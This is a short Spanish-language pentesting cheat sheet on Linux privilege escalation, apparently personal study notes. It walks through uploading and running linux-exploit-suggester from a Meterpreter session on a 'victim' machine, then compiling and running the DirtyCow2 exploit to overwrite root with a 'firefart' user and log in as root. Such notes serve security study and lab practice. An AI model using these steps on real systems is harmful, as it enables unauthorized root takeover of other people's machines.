# Kernel 

Tags: #Kernel #DirtyCow2

Este binario nos brinda información del Kernel, además de mostrarnos algunos CVE que podemos explotar para poder elevar nuestros privilegios. 
* [Linux Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

```bash 
❯ sysinfo        # Nos muestra informacion de Linux, asi como la version del Kernel 
❯ getuid         # Nos muestra el username del servidor 
```

```bash 
# Descargar el Linux Suggester 
❯ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh 

# Esto lo hacemos estando en una sesion de Meterpreter 
❯ cd /tmp                           # Es un directorio con privilegios de escritura y de lectura 
❯ upload ~/Descktop/les.sh          # Cargamos el archivo a la maquina victima 
❯ shell                             # Obtener una sesion Shell y asi poder ejecutar el binario 
❯ chmod +x les.sh 
❯ ./les.sh                          # Ejecutamos el binario 
```

## DirtyCow2

* [DirtyCow2](https://www.exploit-db.com/exploits/40839)

```bash 
❯ apt install gcc                          # Instalar el GCC
```

```bash 
# Se puede usar en el Kernel 2.6.22 < 3.9
❯ gcc -pthread dirty.c -o dirty -lcrypt     # compilar el binario y nos regresa un nuevo archivo llamado 'dirty'
❯ chmod +x dirty 
❯ ./dirty <passwd>                          # Ejecutamos el binario y le colocamos la passwd que queramos

# Este binario nos va a crear un usuario llamado 'firefart' y lo reemplazara en el usuario 'root' 

❯ su firefart                               # Colocamos la passwd que ingresamos al momento de ejecutarlo y ahora seremos root
❯ ssh firefart@<IP>                         # Tambien podemos ingresar por SSH
	❯ ssh-keygen -f "/homekali/.ssh/known_hosts" -R "<IP>" # Si nos da un problema al momento de ingresar por SSH, colocamos ese comando y lo volvemos a intentar por SSH con el comando anterior 
```